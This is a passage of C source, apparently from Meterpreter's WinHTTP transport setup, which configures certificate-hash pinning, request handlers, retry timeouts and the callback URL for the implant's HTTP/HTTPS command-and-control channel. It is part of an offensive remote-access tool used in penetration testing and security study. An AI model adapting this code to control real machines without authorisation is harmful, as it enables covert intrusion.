		config->ssl_cert_hash[16], config->ssl_cert_hash[17], config->ssl_cert_hash[18], config->ssl_cert_hash[19]);

	// only apply the cert hash if we're given one and it's not the global value
	SAFE_FREE(ctx->cert_hash);
	unsigned char emptyHash[CERT_HASH_SIZE] = { 0 };
	if (memcmp(config->ssl_cert_hash, emptyHash, CERT_HASH_SIZE))
	{
		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
		memcpy(ctx->cert_hash, config->ssl_cert_hash, 20);
	}

	ctx->create_req = get_request_winhttp;
	ctx->send_req = send_request_winhttp;
	ctx->close_req = close_request_winhttp;
	ctx->validate_response = validate_response_winhttp;
	ctx->receive_response = receive_response_winhttp;
	ctx->read_response = read_response_winhttp;

	transport->timeouts.comms = config->common.comms_timeout;
	transport->timeouts.retry_total = config->common.retry_total;
	transport->timeouts.retry_wait = config->common.retry_wait;
	transport->type = ctx->ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
	ctx->url = transport->url = _wcsdup(config->common.url);
	transport->packet_transmit = packet_transmit_via_http;
	transport->server_dispatch = server_dispatch_http;
	transport->transport_init = server_init_winhttp;
	transport->transport_deinit = server_deinit_http;
	transport->transport_destroy = transport_destroy_http;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();

	return transport;
}
